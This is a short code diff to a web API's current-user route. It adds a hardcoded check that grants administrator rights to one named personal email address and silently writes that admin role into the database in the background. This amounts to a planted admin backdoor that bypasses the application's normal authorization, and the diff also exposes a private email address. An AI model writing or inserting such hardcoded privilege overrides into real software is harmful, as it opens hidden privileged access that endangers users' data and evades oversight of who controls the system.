@@ -156,6 +156,16 @@ router.get("/me", async (req, res) => {
         }
 
         const { passwordHash: _, ...userWithoutPassword } = user;
+
+        // FORCE ADMIN OVERRIDE FOR HAMZA
+        if (user.email.toLowerCase() === "hamzali200410@gmail.com") {
+            userWithoutPassword.role = "admin";
+            // Async background update to fix DB if needed
+            if (user.role !== "admin") {
+                db.update(users).set({ role: "admin" }).where(eq(users.id, user.id)).catch(console.error);
+            }
+        }
+
         return res.json(userWithoutPassword);
     } catch (error) {
         console.error("Get current user error:", error);
